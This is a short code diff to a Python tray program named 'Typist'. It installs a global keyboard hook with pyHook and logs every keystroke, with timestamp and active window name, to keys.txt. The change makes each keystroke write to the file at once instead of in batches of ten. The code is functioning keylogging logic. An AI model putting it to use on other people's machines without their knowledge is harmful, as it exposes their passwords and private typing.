@@ -4,7 +4,6 @@ tray('Typist', 'typist.ico')
 import pythoncom, pyHook 
 
 event_template = '{Time} - {KeyID} ({key_name}) - {WindowName}'
-events = []
 
 def OnKeyboardEvent(event):
     if event.Ascii:
@@ -12,10 +11,9 @@ def OnKeyboardEvent(event):
     else:
         key_name = ''
 
-    events.append(event_template.format(key_name=key_name, **event.__dict__))
-
-    if len(events) % 10 == 0:
-        open('keys.txt', 'a').write('\n'.join(events) + '\n')
+    event_text = event_template.format(key_name=key_name, **event.__dict__)
+    with open('keys.txt', 'a') as keys_file:
+        keys_file.write(event_text + '\n')
 
     return True
 
